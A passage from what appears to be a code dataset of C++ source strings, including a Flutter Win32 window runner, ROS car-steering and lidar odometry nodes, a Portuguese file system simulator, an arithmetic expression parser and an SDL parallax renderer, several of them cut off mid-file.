false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <ros/ros.h>\n#include <geometry_msgs/Twist.h>\n#include <geometry_msgs/Point.h>\n#include <visualization_msgs/Marker.h>\n\nusing namespace std;\n\nros::Publisher car_control_pub;\nros::Publisher rviz_target_point_pub;\n\nfloat car_steering_rad = 0.0;\ndouble deg2rad = M_PI/180;\ndouble rad2deg = 180/M_PI;\ndouble car_pos_x, car_pos_y = 0.0;\n\n//////////////////////////////////////////////////////////\nstd::pair<double ,double> target_point = {5.0, 2.76756905};     //{X, Y}  unit : [m]\n        \ndouble car_velocity = 0.3;                                      //unit : [m/s]\n/////////////////////////////////////////////////////////\n\nfloat Calculate_steering()\n{\n    double dx = (target_point.first - car_pos_x);\n    double dy = (target_point.second - car_pos_y);\n\n    double dist = sqrt(dx*dx + dy*dy);\n\n    double alpha = atan2(dy, dx);\n\n    float steering_rad = alpha;\n    \n    return steering_rad;\n}\n\nvoid Car_pos_Callback(const geometry_msgs::Point::ConstPtr &car_pos)\n{\n    car_pos_x = car_pos->x;\n    car_pos_y = car_pos->y; \n}\n\nvoid Publish_control_value()\n{\n    geometry_msgs::Twist car_control;\n\n    car_control.linear.x = car_velocity;\n    car_control.angular.z = car_steering_rad;\n\n    car_control_pub.publish(car_control);\n}\n\nvoid Rviz_target_point()\n{\n    visualization_msgs::Marker t_point;\n\n    t_point.header.frame_id = \"edu_frame\";\n    t_point.header.stamp = ros::Time::now();\n    t_point.ns = \"target_point\";\n    t_point.id = 0;\n    t_point.type = visualization_msgs::Marker::SPHERE;\n    t_point.action = visualization_msgs::Marker::ADD;\n    t_point.lifetime = ros::Duration(0.2);\n\n    t_point.pose.position.x = target_point.first;\n    t_point.pose.position.y = target_point.second;\n    t_point.pose.position.z = 0;\n\n    t_point.scale.x = 0.3;\n    t_point.scale.y = 0.3;\n    t_point.scale.z = 0.0;\n\n    t_point.color.r = 0.0;      \n    t_point.color.g = 1.0;     \n    t_point.color.b = 0.0;\n    \n    t_point.color.a = 1.0;\n\n    rviz_target_point_pub.publish(t_point);\n}\n\nint main(int argc, char **argv)\n{\n\tros::init(argc, argv, \"edu_angle_steering_node\");\n\tros::NodeHandle nh;\n\n    ros::Rate loop(8);\n\n    ros::Subscriber car_position_sub = nh.subscribe<geometry_msgs::Point>(\"/car_position\", 10, &Car_pos_Callback);\n\n    car_control_pub = nh.advertise<geometry_msgs::Twist> (\"/control_value\", 10);\n    rviz_target_point_pub = nh.advertise<visualization_msgs::Marker> (\"/rviz_target_point\", 10);\n\n    geometry_msgs::Twist car_control;\n\n\twhile(ros::ok())\n    {\t\n        car_steering_rad = Calculate_steering();\n\n        Publish_control_value();\n\n        Rviz_target_point();\n\t\t\n        cout << \"Target point position(X, Y)[m]\" << endl;\n        cout << target_point.first << \", \" << target_point.second << endl;\n        cout << \" \" << endl;\n\t\n        cout << \"Car velocity[m/s] : \" << car_velocity << endl;\n        cout << \"Car steering[deg] : \" << car_steering_rad*rad2deg << endl;\n        cout << \" \" << endl;\n\n        cout << \"Car position(X, Y)[m]\" << endl;\n        cout << car_pos_x << \", \" << car_pos_y << endl;\n        cout << \" \" << endl;\n\n        cout << \"****************************\" << endl;\n        cout << \" \" << endl;\n\n        loop.sleep();\n\n\t\tros::spinOnce();\n\t}\n\t\n    return 0;\n}\n",
    "#include <memory>\n#include <vector>\n#include <string>\n#include <iostream>\n#include <algorithm>\n#include <sstream>\n\nclass Arquivo {\nprivate:\n    std::string nome;\n    std::string conteudo;\n\npublic:\n    Arquivo(const std::string& nome) : nome(nome), conteudo(\"\") {}\n\n    void escrever(const std::string& novoConteudo) {\n        this->conteudo = novoConteudo;\n    }\n\n    void ler() const {\n        std::cout << \"Conte\u00fado do arquivo '\" << nome << \"': \" << conteudo << std::endl;\n    }\n\n    const std::string& getNome() const {\n        return nome;\n    }\n};\n\nclass Diretorio {\nprivate:\n    std::string nome;\n    std::vector<std::shared_ptr<Arquivo>> arquivos;\n    std::vector<std::shared_ptr<Diretorio>> diretorios;\n\npublic:\n    Diretorio(const std::string& nome) : nome(nome) {}\n\n    bool adicionarArquivo(const std::string& nomeArquivo) {\n        if (encontrarArquivo(nomeArquivo)) {\n            return false;\n        }\n        arquivos.push_back(std::make_shared<Arquivo>(nomeArquivo));\n        return true;\n    }\n\n    bool removerArquivo(const std::string& nomeArquivo) {\n        auto it = std::find_if(arquivos.begin(), arquivos.end(),\n            [&nomeArquivo](const std::shared_ptr<Arquivo>& arquivo) {\n                return arquivo->getNome() == nomeArquivo;\n            });\n        if (it != arquivos.end()) {\n            arquivos.erase(it);\n            return true;\n        }\n        return false;\n    }\n\n    bool adicionarDiretorio(const std::string& nomeDiretorio) {\n        if (getDiretorio(nomeDiretorio)) {\n            return false;\n        }\n        diretorios.push_back(std::make_shared<Diretorio>(nomeDiretorio));\n        return true;\n    }\n\n    bool removerDiretorio(const std::string& nomeDiretorio) {\n        auto it = std::find_if(diretorios.begin(), diretorios.end(),\n            [&nomeDiretorio](const std::shared_ptr<Diretorio>& diretorio) {\n                return diretorio->getNome() == nomeDiretorio && diretorio->isEmpty();\n            });\n        if (it != diretorios.end()) {\n            diretorios.erase(it);\n            return true;\n        }\n        return false;\n    }\n\n    std::shared_ptr<Diretorio> getDiretorio(const std::string& nomeDiretorio) {\n        for (auto& diretorio : diretorios) {\n            if (diretorio->getNome() == nomeDiretorio) {\n                return diretorio;\n            }\n        }\n        return nullptr;\n    }\n\n    std::shared_ptr<Arquivo> encontrarArquivo(const std::string& nomeArquivo) {\n        auto it = std::find_if(arquivos.begin(), arquivos.end(),\n            [&nomeArquivo](const std::shared_ptr<Arquivo>& arquivo) {\n                return arquivo->getNome() == nomeArquivo;\n            });\n        return it != arquivos.end() ? *it : nullptr;\n    }\n\n    void escreverArquivo(const std::string& nomeArquivo, const std::string& conteudo) {\n        auto arquivo = encontrarArquivo(nomeArquivo);\n        if (arquivo) {\n            arquivo->escrever(conteudo);\n        }\n        else {\n            std::cout << \"Erro: Arquivo n\u00e3o encontrado.\\n\";\n        }\n    }\n\n    void lerArquivo(const std::string& nomeArquivo) {\n        auto arquivo = encontrarArquivo(nomeArquivo);\n        if (arquivo) {\n            arquivo->ler();\n        }\n        else {\n            std::cout << \"Erro: Arquivo n\u00e3o encontrado.\\n\";\n        }\n    }\n\n    void listarConteudo() const {\n        std::cout << \"Conte\u00fado do Diret\u00f3rio '\" << nome << \"':\" << std::endl;\n        for (const auto& arquivo : arquivos) {\n            std::cout << \"  Arquivo: \" << arquivo->getNome() << std::endl;\n        }\n        for (const auto& diretorio : diretorios) {\n            std::cout << \"  Diret\u00f3rio: \" << diretorio->getNome() << std::endl;\n        }\n    }\n\n    const std::string& getNome() const {\n        return nome;\n    }\n\n    bool isEmpty() const {\n        return arquivos.empty() && diretorios.empty();\n    }\n};\n\nint main() {\n    std::shared_ptr<Diretorio> root = std::make_shared<Diretorio>(\"root\");\n    std::shared_ptr<Diretorio> currentDir = root;\n    std::string linha, comando, nome, conteudo;\n\n    std::cout << \"Simulador de Sistema de Arquivos iniciado. Digite 'help' para ajuda.\\n\";\n\n    while (true) {\n        std::cout << currentDir->getNome() << \"> \";\n        std::getline(std::cin, linha);\n        std::istringstream iss(linha);\n        iss >> comando;\n\n        if (comando == \"create_file\") {\n            iss >> nome;\n            if (!currentDir->adicionarArquivo(nome)) {\n                std::cout << \"Erro: Arquivo j\u00e1 existe.\\n\";\n            }\n        }\n        else if (comando == \"write_file\") {\n            iss >> nome;\n            iss.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\n            std::getline(std::cin, conteudo);  \n            currentDir->escreverArquivo(nome, conteudo);\n        }\n        else if (comando == \"read_file\") {\n            iss >> nome;\n            currentDir->lerArquivo(nome);\n        }\n        else if (comando == \"delete_file\") {\n            iss >> nome;\n            if (!currentDir->removerArquivo(nome)) {\n",
    "// Author of FLOAM: Wang Han\n// Email wh200720041@gmail.com\n// Homepage https://wanghan.pro\n\n// c++ lib\n#include <cmath>\n#include <vector>\n#include <mutex>\n#include <queue>\n#include <thread>\n#include <chrono>\n\n// ros lib\n#include <ros/ros.h>\n#include <sensor_msgs/PointCloud2.h>\n#include <nav_msgs/Odometry.h>\n#include <tf/transform_datatypes.h>\n#include <tf/transform_broadcaster.h>\n\n// pcl lib\n#include <pcl_conversions/pcl_conversions.h>\n#include <pcl/point_cloud.h>\n#include <pcl/point_types.h>\n\n// local lib\n#include \"lidar.h\"\n#include \"odomEstimationClass.h\"\n#include \"valGenerationClass.h\"\n\nOdomEstimationClass odomEstimation;\nstd::mutex mutex_lock;\nstd::queue<sensor_msgs::PointCloud2ConstPtr> pointCloudEdgeBuf;\nstd::queue<sensor_msgs::PointCloud2ConstPtr> pointCloudSurfBuf;\nstd::queue<sensor_msgs::PointCloud2ConstPtr> pointCloudBuf;\nstd::queue<sensor_msgs::ImageConstPtr> imgBuf;\ncv_bridge::CvImagePtr imageRaw;\n\nlidar::Lidar lidar_param;\n\nros::Publisher pubLaserOdometry;\n\nvoid velodyneSurfHandler(const sensor_msgs::PointCloud2ConstPtr &laserCloudMsg)\n{\n    mutex_lock.lock();\n    pointCloudSurfBuf.push(laserCloudMsg);\n    mutex_lock.unlock();\n}\nvoid velodyneEdgeHandler(const sensor_msgs::PointCloud2ConstPtr &laserCloudMsg)\n{\n    mutex_lock.lock();\n    pointCloudEdgeBuf.push(laserCloudMsg);\n    mutex_lock.unlock();\n}\nvoid velodyneHandler(const sensor_msgs::PointCloud2ConstPtr &laserCloudMsg)\n{\n    mutex_lock.lock();\n    pointCloudBuf.push(laserCloudMsg);\n    mutex_lock.unlock();\n}\nvoid imageRawHandler(const sensor_msgs::ImageConstPtr &msg)\n{\n    mutex_lock.lock();\n    imgBuf.push(msg);\n    mutex_lock.unlock();\n}\n\nbool is_odom_inited = false;\ndouble total_time = 0;\nint total_frame = 0;\nvoid odom_estimation()\n{\n    VALGENERATIONCLASS VALAM;\n\n    while (1)\n    {\n\n        if (!pointCloudEdgeBuf.empty() && !pointCloudSurfBuf.empty() && !pointCloudBuf.empty() && !imgBuf.empty()) //&& !pointCloudEdgeMapBuf.empty() && !pointCloudMatchedEdgeBuf.empty() && !pointCloudSurfMapBuf.empty() && !pointCloudMatchedSurfBuf.empty()        {\n        {\n            struct timespec begin, end;\n            clock_gettime(CLOCK_MONOTONIC, &begin);\n            // read data\n            mutex_lock.lock();\n            if (!pointCloudBuf.empty() && (pointCloudBuf.front()->header.stamp.toSec() < pointCloudSurfBuf.front()->header.stamp.toSec() - 0.5 * lidar_param.scan_period || pointCloudBuf.front()->header.stamp.toSec() < pointCloudEdgeBuf.front()->header.stamp.toSec() - 0.5 * lidar_param.scan_period))\n            {\n                ROS_WARN(\"time stamp unaligned error and odom discarded, pls check your data --> odom correction\\n\");\n                pointCloudBuf.pop();\n                mutex_lock.unlock();\n                continue;\n            }\n\n            if (!pointCloudSurfBuf.empty() && (pointCloudSurfBuf.front()->header.stamp.toSec() < pointCloudBuf.front()->header.stamp.toSec() - 0.5 * lidar_param.scan_period || pointCloudSurfBuf.front()->header.stamp.toSec() < pointCloudEdgeBuf.front()->header.stamp.toSec() - 0.5 * lidar_param.scan_period))\n            {\n                pointCloudSurfBuf.pop();\n                ROS_INFO(\"time stamp unaligned with extra point cloud, pls check your data --> odom correction\\n\");\n                mutex_lock.unlock();\n                continue;\n            }\n\n            if (!pointCloudEdgeBuf.empty() && (pointCloudEdgeBuf.front()->header.stamp.toSec() < pointCloudBuf.front()->header.stamp.toSec() - 0.5 * lidar_param.scan_period || pointCloudEdgeBuf.front()->header.stamp.toSec() < pointCloudSurfBuf.front()->header.stamp.toSec() - 0.5 * lidar_param.scan_period))\n            {\n                pointCloudEdgeBuf.pop();\n                ROS_INFO(\"time stamp unaligned with extra point cloud, pls check your data --> odom correction \\n\");\n                mutex_lock.unlock();\n                continue;\n            }\n            if (!imgBuf.empty() && (imgBuf.front()->header.stamp.toSec() < pointCloudBuf.front()->header.stamp.toSec() - 0.5 * lidar_param.scan_period || imgBuf.front()->header.stamp.toSec() < pointCloudSurfBuf.front()->header.stamp.toSec() - 0.5 * lidar_param.scan_period))\n            {\n                imgBuf.pop();\n                ROS_INFO(\"imgBuf time stamp unaligned with extra point cloud, pls check your data --> odom correction \\n\");\n                mutex_lock.unlock();\n                continue;\n            }\n\n            // if time aligned\n            pcl::PointCloud<pcl::PointXYZI>::Ptr pointcloud_surf_in(new pcl::PointCloud<pcl::PointXYZI>());\n            pcl::PointCloud<pcl::PointXYZI>::Ptr pointcloud_edge_in(new pcl::PointCloud<pcl::PointXYZI>());\n            pcl::PointCloud<pcl::PointXYZI>::Ptr pointcloud_in(new pcl::PointCloud<pcl::PointXYZI>());\n\n            pcl::fromROSMsg(*pointCloudEdgeBuf.front(), *pointcloud_edge_in);\n            pcl::fromROSMsg(*pointCloudSurfBuf.front(), *pointcloud_surf_in);\n            pcl::fromROSMsg(*pointCloudBuf.front(), *pointcloud_in);\n            ros::Time pointclo",
    "/*\n * AritMix - Analisador de expressoes aritmeticas In-Fixas.\n * Prof.: Cleuton Sampaio\n * (ANSI C++ com C++ Standard Template Library)\n *\n * Vers\u00e3o atual: 1.0 - Marco 2003\n *\n * Operadores aritmeticos:\n *     \"+\" -> Soma\n *     \"-\" -> Subtracao\n *     \"*\" -> Multiplicao\n *     \":\" -> Divisao\n *     \"^\" -> Exponenciao\n *\n * Aceita parentesis\n *\n * Casos de teste (ja\ufffd calculados):\n * 1+2 = 3\n * 1--3 = ERRO!\n * ((5-3) * (2*3) -1) = 11\n * 1:(5^(3-2)+1) = 0,166666667\n * 4^(1:2) = 2\n * ((1 + 2) * (6/2)) = ERRO!\n * (1+2)^((4-2) * (1+2)) = 729\n * -3 *(-2*5)^2 = -300\n *\n * Uso: aritmix [opcoes]\n * -d = debug: imprimir calculos e pilha\n * -t = executar os testes: roda as expressoes de teste acima.\n *\n */\n\n#include <iostream>\n#include <sstream>\n#include <string>\n#include <stack>\n#include <vector>\n#include <cctype>\n#include <cmath>\n\nusing namespace std;\n\nbool debug = false;\nbool runTests = false;\n\n#define DEBUG(msg) if (debug) cout << endl << msg << endl;\n#define ERRO(msg) cout << endl << \"**** ERRO: \" << msg << endl;\n\n\n\ntypedef struct elementoStruct {\n        bool fim;\n        bool erro;\n        bool eOperando;\n        double operando;\n        bool eOperador;\n        char operador;} TElemento;\n\nstack <double> pilha;\nvector <TElemento> listaPosFixa;\nstack <char> pilhaOperadores;\n\nvoid parseArgs(int qtde, char* args[]) {\n     for (int x = 0; x < qtde; x++) {\n         string arg (args[x]);\n         if (arg == \"-d\") {\n            debug = true;\n         }\n         if (arg == \"-t\") {\n        \t runTests = true;\n         }\n     }\n}\n\nvoid posfixa ( double operando ) {\n       pilha.push(operando);\n}\n\n\nvoid posfixa ( char operador ) {\n       double op2 = pilha.top();\n       pilha.pop();\n       double op1 = pilha.top();\n       pilha.pop();\n       double resultado = 0.0;\n       stringstream ss1;\n       string msg;\n       if (operador == '+') {\n          resultado = op1 + op2;\n       }\n       else if (operador == '*') {\n               resultado = op1 * op2;\n            }\n            else if (operador == ':' || operador == '/') {\n                    resultado = op1 / op2;\n                 }\n                 else if (operador == '^') {\n                         resultado = pow(op1,op2);\n                      }\n                      else  if (operador == '-') {\n                               resultado = op1 - op2;\n                            }\n                            else if (operador == '^') {\n                            \t\tresultado = pow(op1,op2);\n                            }\n                            else {\n                                 ERRO(\"**** Operador invalido: \" + operador);\n                                 return;\n                            }\n       ss1 << \"CALCULAR: \" << operador\n                          << \"(\" << op1 << \", \" << op2\n                          << \")\" << \" = \" << resultado;\n       getline(ss1, msg);\n       DEBUG(msg);\n\n       pilha.push(resultado);\n}\n\nbool isOperador ( char pos ) {\n     bool retorno = false;\n     if (pos == '+' || pos == '-' || pos == '^' ||\n         pos == '*' || pos == ':' || pos == '/' ||\n         pos == '^' ||\n         pos == '(' || pos == ')') {\n         retorno = true;\n     }\n     return (retorno);\n}\n\nTElemento parse (string expressao, int &posicao) {\n       TElemento elem = {false, false, false, 0.0, false, 0};\n       string operando = \"\";\n\n       stringstream stream;\n       while (true) {\n             if ((unsigned) posicao >= expressao.length()) {\n                if (operando.length() > 0) {\n                   stream << operando;\n                   stream >> elem.operando;\n                   elem.eOperando = true;\n                   break;\n                }\n                elem.fim = true;\n                break;\n             }\n             if (isdigit(expressao[posicao]) || expressao[posicao] == '.') {\n                operando += expressao[posicao];\n                posicao++;\n             }\n             else if (isOperador(expressao[posicao])) {\n\n                     if (operando.length() > 0) {\n                        // retorna o operando\n                        stream << operando;\n                        stream >> elem.operando;\n                        elem.eOperando = true;\n                        break;\n                     }\n                     else {\n                          // retorna o operador\n                          elem.eOperador = true;\n                          elem.operador = expressao[posicao];\n                          posicao++;\n                          break;\n                     }\n                  }\n                  else {\n                       // \u00e9 whitespace\n                \t  if (!isspace(expressao[posicao]) ) {\n                \t\t  cout << endl << \"**** ERRO: caracter invalido na expressao: \"\n                \t\t  \t   << expressao[posicao] << \" na posicao: \" << posicao <<\n                \t\t  \t   endl << \"[[\" << expressao << \"]]\";\n\n                \t\t  elem.erro = true;\n                \t\t  break;\n                \t  }\n                \t  posicao++",
    "#include \"test.h\"\n#include <SDL.h>\n#include <stdio.h>\n#include <SDL_image.h>\n#include <string>\n#include <vector>\n\nconst int SCREEN_WIDTH = 800;\nconst int SCREEN_HEIGHT = 600;\nconst int IMAGE_WIDTH = SCREEN_WIDTH + 300;\n\nSDL_Window* gWindow = NULL;\nSDL_Renderer* gRenderer = NULL;\nint speed = 0.1;\nint CameraX = 0;\nint textureWidthDiff = IMAGE_WIDTH - SCREEN_WIDTH;\n\nSDL_Texture* loadTexture(const std::string& path) {\n    // The final texture\n    SDL_Texture* newTexture = NULL;\n\n    // Load image at specified path\n    SDL_Surface* loadedSurface = IMG_Load(path.c_str());\n    if (loadedSurface == NULL) {\n        printf(\"Unable to load image %s! SDL_image Error: %s\\n\", path.c_str(), IMG_GetError());\n    }\n    else {\n        // Create texture from surface pixels\n        newTexture = SDL_CreateTextureFromSurface(gRenderer, loadedSurface);\n        if (newTexture == NULL) {\n            printf(\"Unable to create texture from %s! SDL Error: %s\\n\", path.c_str(), SDL_GetError());\n        }\n\n        // Get rid of old loaded surface\n        SDL_FreeSurface(loadedSurface);\n    }\n\n    return newTexture;\n}\n\nbool initSDL()\n{\n    // Initialize SDL\n    if (SDL_Init(SDL_INIT_VIDEO) < 0) {\n        printf(\"SDL could not initialize! SDL_Error: %s\\n\", SDL_GetError());\n        return false;\n    }\n\n    // Create window\n    gWindow = SDL_CreateWindow(\"2D Rendering\", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, SCREEN_WIDTH, SCREEN_HEIGHT, SDL_WINDOW_SHOWN);\n    if (gWindow == NULL) {\n        printf(\"Window could not be created! SDL_Error: %s\\n\", SDL_GetError());\n        return false;\n    }\n\n    // Create renderer\n    gRenderer = SDL_CreateRenderer(gWindow, -1, SDL_RENDERER_ACCELERATED | SDL_RENDERER_PRESENTVSYNC);\n    if (gRenderer == NULL) {\n        printf(\"Renderer could not be created! SDL_Error: %s\\n\", SDL_GetError());\n        return false;\n    }\n\n    // Set renderer color\n    SDL_SetRenderDrawColor(gRenderer, 0xFF, 0xFF, 0xFF, 0xFF);\n\n    // Allows for (Initializes) Image Loading abilities using SDL_image library\n    int imgFlags = IMG_INIT_PNG;\n    if (!(IMG_Init(imgFlags) & imgFlags)) {\n        printf(\"SDL_image could not initialize! SDL_image Error: %s\\n\", IMG_GetError());\n        return false;\n    }\n\n    return true;\n}\n\nvoid closeSDL()\n{\n    // Destroy window\n    SDL_DestroyRenderer(gRenderer);\n    SDL_DestroyWindow(gWindow);\n    gWindow = NULL;\n    gRenderer = NULL;\n\n    // Quit SDL subsystems\n    IMG_Quit();\n    SDL_Quit();\n}\n\nint main(int argc, char* argv[]) {\n    if (!initSDL()) {\n        printf(\"Failed to initialize SDL!\\n\");\n        return -1;\n    }\n\n    std::vector<SDL_Texture*> backgroundTextures;\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer0.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer1.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer2.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer3.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer4.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer5.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer6.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer7.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer8.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer9.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer10.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer11.png\"));\n\n\n\n\n    SDL_Texture* backgroundFloor = loadTexture(\"./Assets/grassfloor.png\");\n    SDL_Texture* backgroundSky = loadTexture(\"./Assets/skytoon.jpg\");\n\n    // Main loop flag\n    bool quit = false;\n\n    // Event handler\n    SDL_Event e;\n\n    while (!quit) {\n        // Handle events on queue\n        while (SDL_PollEvent(&e) != 0) {\n            // User requests quit\n            if (e.type == SDL_QUIT) {\n                quit = true;\n            }\n        }\n\n        // Clear screen\n        SDL_RenderClear(gRenderer);\n\n        //SDL_Rect skyDest = { 0, -400, 800, 810 };\n        //SDL_RenderCopy(gRenderer, backgroundSky, NULL, &skyDest);\n\n        //SDL_RenderCopy(gRenderer, backgroundFloor, NULL, NULL);\n\n        for (SDL_Texture* texture : backgroundTextures) {\n            SDL_Rect textureDest = { 0, 0, IMAGE_WIDTH, SCREEN_HEIGHT };\n            SDL_RenderCopy(gRenderer, texture, NULL, &textureDest);\n        }\n\n        // Update screen\n        SDL_RenderPresent(gRenderer);\n    }\n\n    // Destroy textures\n    //SDL_DestroyTexture(enemyTexture);\n    SDL_DestroyTexture(backgroundFloor);\n    SDL_DestroyTexture(backgroundSky);\n\n    for (SDL_Texture* texture : backgroundTextures) {\n        SDL_DestroyTexture(texture);\n    }\n\n    // Close SDL\n    closeSDL();\n\n\treturn 0;\n}\n",
